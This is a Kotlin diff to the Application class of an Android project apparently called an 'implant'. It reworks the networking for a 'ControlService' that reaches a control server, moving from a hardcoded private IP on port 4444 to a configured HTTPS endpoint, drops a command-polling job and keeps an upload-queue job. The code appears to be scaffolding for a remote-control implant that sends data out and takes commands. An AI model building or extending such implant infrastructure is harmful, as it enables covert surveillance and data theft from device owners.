@@ -1,7 +1,6 @@
 package com.cooperthecoder.implant
 
 import android.app.Application
-import com.cooperthecoder.implant.jobs.CheckForCommandsJob
 import com.cooperthecoder.implant.jobs.UploadQueueJob
 import com.cooperthecoder.implant.network.ControlService
 import com.evernote.android.job.JobManager
@@ -16,7 +15,7 @@ class App: Application() {
         lateinit var instance: App
     }
 
-    val controlService: ControlService by lazy {
+    val client: OkHttpClient by lazy {
         val client = OkHttpClient()
         client.interceptors().add(Interceptor {
             val original = it.request()
@@ -27,9 +26,14 @@ class App: Application() {
             it.proceed(request)
 
         })
+        client
+    }
+
+    val controlService: ControlService by lazy {
         Retrofit.Builder()
                 .addConverterFactory(MoshiConverterFactory.create())
-                .baseUrl("http://172.16.184.161:4444/")
+                .client(client)
+                .baseUrl(Config.HTTPS_ENDPOINT)
                 .build()
                 .create(ControlService::class.java)
     }
@@ -41,10 +45,6 @@ class App: Application() {
             when (it) {
                 UploadQueueJob.JOB_NAME -> {
                     UploadQueueJob()
-                }
-
-                CheckForCommandsJob.JOB_NAME -> {
-                    CheckForCommandsJob()
                 }
 
                 else -> {
